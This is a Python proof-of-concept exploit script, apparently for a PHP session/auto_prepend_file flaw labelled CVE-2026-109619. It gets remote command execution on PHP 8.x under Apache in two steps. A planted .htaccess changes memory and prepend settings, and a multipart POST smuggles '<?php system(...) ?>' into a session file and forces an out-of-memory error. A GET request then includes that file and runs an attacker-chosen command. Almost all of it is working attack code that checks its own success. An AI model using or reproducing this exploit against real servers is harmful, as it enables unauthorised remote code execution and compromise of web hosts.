#!/usr/bin/env python3
"""
CVE-2026-109619 → HTTP RCE  (against DEFAULT php.ini)
Target: PHP 8.x + Apache with AllowOverride All (stock default php.ini)

PHP is running with stock defaults:
  memory_limit=128M  post_max_size=8M  use_only_cookies=1

A single .htaccess overrides php_value to enable the OOM window AND
the auto_prepend_file inclusion — all in one file.

Prerequisites (set up before running):
  1. Place .htaccess in web root (see HTACCESS content below)
  2. Apache must have AllowOverride All

Chain
─────
  .htaccess sets: memory_limit=8M, post_max_size=256M,
                  auto_prepend_file → session file
  1. Producer POST: multipart with PHP code in filename + 12 MB body
     → .htaccess lowers memory_limit → OOM → session preserved
     → auto_prepend target doesn't exist yet → E_WARNING, harmless
  2. Trigger GET:  auto_prepend now finds the session file → includes it
     → PHP parser hits <?php tag inside serialised data → executes → RCE
"""
import os, socket, ssl, sys, threading, time

HOST = os.environ.get("TARGET_HOST", "127.0.0.1")
PORT = int(os.environ.get("TARGET_PORT", "80"))
SID  = "rce002"
SESS_PATH = os.environ.get("SESSION_PATH", "/var/lib/php/sessions")
SESS = f"{SESS_PATH}/sess_{SID}"
CMD  = os.environ.get("CMD", "id")
PHP  = f"<?php system('{CMD}');die(); ?>"

HTACCESS = f"""\
php_value memory_limit 8M
php_value post_max_size 256M
php_value auto_prepend_file {SESS}
"""

def multipart(parts, bnd):
    buf = bytearray()
    for p in parts:
        nm = p["name"] if isinstance(p["name"], bytes) else p["name"].encode()
        dt = p["data"] if isinstance(p["data"], bytes) else p["data"].encode()
        buf += b"--" + bnd + b"\r\n"
        buf += b'Content-Disposition: form-data; name="' + nm + b'"'
        if "filename" in p:
            fn = p["filename"] if isinstance(p["filename"], bytes) else p["filename"].encode()
            buf += b'; filename="' + fn + b'"'
            buf += b"\r\nContent-Type: application/octet-stream"
        buf += b"\r\n\r\n" + dt + b"\r\n"
    buf += b"--" + bnd + b"--\r\n"
    return bytes(buf)

def http_req(method, path, body=None, bnd=None, timeout=120):
    if body:
        hdr = (
            f"{method} {path} HTTP/1.1\r\n"
            f"Host: {HOST}:{PORT}\r\n"
            f"Content-Type: multipart/form-data; boundary={bnd.decode()}\r\n"
            f"Content-Length: {len(body)}\r\n"
            f"Connection: close\r\n\r\n"
        ).encode()
    else:
        hdr = (
            f"GET {path} HTTP/1.1\r\n"
            f"Host: {HOST}:{PORT}\r\n"
            f"Connection: close\r\n\r\n"
        ).encode()
    raw = socket.create_connection((HOST, PORT), timeout=timeout)
    if PORT == 443:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        sock = ctx.wrap_socket(raw, server_hostname=HOST)
    else:
        sock = raw
    sock.settimeout(timeout)
    data = bytearray()
    def rx():
        try:
            while True:
                c = sock.recv(65536)
                if not c:
                    break
                data.extend(c)
        except Exception:
            pass
    t = threading.Thread(target=rx, daemon=True)
    t.start()
    try:
        sock.sendall(hdr)
        if body:
            for off in range(0, len(body), 262144):
                sock.sendall(body[off:off + 262144])
    except Exception:
        pass
    t.join(timeout=timeout + 1)
    sock.close()
    return bytes(data)

def resp_body(raw):
    return raw.split(b"\r\n\r\n", 1)[1] if b"\r\n\r\n" in raw else raw

def resp_status(raw):
    return raw.split(b"\r\n", 1)[0].decode("latin1") if raw else "(empty)"

# ════════════════════════════════════════════════════════════
print("=" * 62)
print("CVE-2026-109619  HTTP → RCE   (default php.ini + .htaccess)")
print(f"Target {HOST}:{PORT}   CMD: {CMD}")
print(f"Session: {SESS}")
print("=" * 62)

print("\nRequired .htaccess content:")
for line in HTACCESS.strip().split("\n"):
    print(f"  {line}")

print(f"\nPlace this .htaccess in the target's web root before running.")

# ── 1  producer OOM ────────────────────────────────────────
print(f"\n[1] producer OOM   SID={SID}")
print(f"    filename = {PHP}")
body = multipart([
    {"name": "PHPSESSID",                   "data": SID},
    {"name": "PHP_SESSION_UPLOAD_PROGRESS",  "data": "pwn"},
    {"name": "f", "filename": PHP,           "data": b"A" * 64},
    {"name": "big",                          "data": b"B" * (12 * 1024 * 1024)},
], b"BOOM")
print(f"    sending {len(body)} bytes …")
page = os.environ.get("TARGET_PAGE", "/index.php")
r1 = http_req("POST", page, body, b"BOOM", timeout=120)
print(f"    {resp_status(r1)}")

if b"500" in r1[:50] or len(r1) == 0:
    print("    ✓ OOM triggered (500 / connection reset)")
else:
    print(f"    ? unexpected response — check .htaccess is in place")

time.sleep(0.5)

# ── 2  trigger RCE ─────────────────────────────────────────
print(f"\n[2] trigger: GET {page}")
print(f"    auto_prepend_file should include {SESS}")
r2 = http_req("GET", page, timeout=10)
out = resp_body(r2).decode("latin1", errors="replace")

# ── result ─────────────────────────────────────────────────
print("\n" + "=" * 62)
if "uid=" in out:
    idx = out.index("uid=")
    end = out.find("\n", idx)
    line = out[idx:end].strip() if end > 0 else out[idx:idx + 80].strip()
    print(f"  ★  RCE confirmed: {line}")
    print(f"  ★  php.ini = stock default, .htaccess did all the work")
elif out.strip():
    print(f"  ?  response ({len(out)} chars):")
    print(f"     {out[:500]}")
else:
    print("  ✗  empty response — check .htaccess is in place")
print("=" * 62)
